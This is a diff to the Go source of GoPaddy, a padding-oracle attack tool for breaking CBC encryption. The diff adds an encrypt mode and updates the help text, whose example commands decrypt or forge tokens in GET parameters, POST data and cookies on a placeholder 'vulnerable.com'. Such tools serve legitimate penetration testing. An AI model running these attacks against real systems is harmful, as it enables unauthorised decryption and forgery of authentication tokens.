@@ -17,12 +17,18 @@ var usage = `
 	A tool to exploit padding oracles, breaking CBC mode encryption.
 	For details see link(https://en.wikipedia.org/wiki/Padding_oracle_attack)
 
-Usage: cmd(GoPaddy [OPTIONS] [CIPHER])
+Usage: cmd(GoPaddy [OPTIONS] [INPUT])
 
-CIPHER:
+INPUT:
+	In decrypt mode:
 	the encoded (as plaintext) value of valid cipher, whose value is to be decrypted
 	if not passed, GoPaddy will use bold(STDIN), reading ciphers line by line
-	The provided cipher must be encoded as specified in flag(-e) and flag(-r) options. 
+	The provided cipher must be encoded as specified in flag(-e) and flag(-r) options.
+
+	In encrypt mode:
+	the plaintext to be encrypted
+	if not passed, GoPaddy will use bold(STDIN), reading plaintexts line by line
+
 
 OPTIONS:
 
@@ -43,6 +49,9 @@ flag(-e)
 	Supported values:
 		b64 (standard base64) *default*
 		lhex (lowercase hex)
+
+flag(-enc)
+	Encrypt mode
 
 flag(-r)
 	Character replacement rules that vulnerable server applies
@@ -81,7 +90,7 @@ flag(-proxy)
 	HTTP proxy. e.g. use cmd(-proxy "http://localhost:8080") for Burp or ZAP
 
 bold(Examples:)
-	Decipher token in GET parameter:
+	Decrypt token in GET parameter:
 	cmd(GoPaddy -u "http://vulnerable.com/login?token=$" -err "Invalid padding" "u7bvLewln6PJ670Gnj3hnE40L0SqG8e6")
 	
 	POST data:
@@ -90,6 +99,8 @@ bold(Examples:)
 	Cookies:
 	cmd(GoPaddy -u "http://vulnerable.com/login$" -cookie "auth=$" -err "Invalid padding" "u7bvLewln6PJ670Gnj3hnE40L0SqG8e6")
 	
+	Encrypt token in GET parameter:
+	cmd(GoPaddy -u "http://vulnerable.com/login?token=$" -err "Invalid padding" -enc "EncryptMe")
 
 `
 
@@ -105,6 +116,7 @@ var config = struct {
 	contentType  *string
 	cookies      []*http.Cookie
 	termWidth    int
+	encrypt      *bool
 }{}
 
 func init() {
@@ -219,6 +231,7 @@ func parseArgs() (ok bool, cipher *string) {
 	config.proxyURL = flag.String("proxy", "", "")
 	config.POSTdata = flag.String("post", "", "")
 	config.contentType = flag.String("ct", "", "")
+	config.encrypt = flag.Bool("enc", false, "")
 
 	// parse
 	flag.Parse()
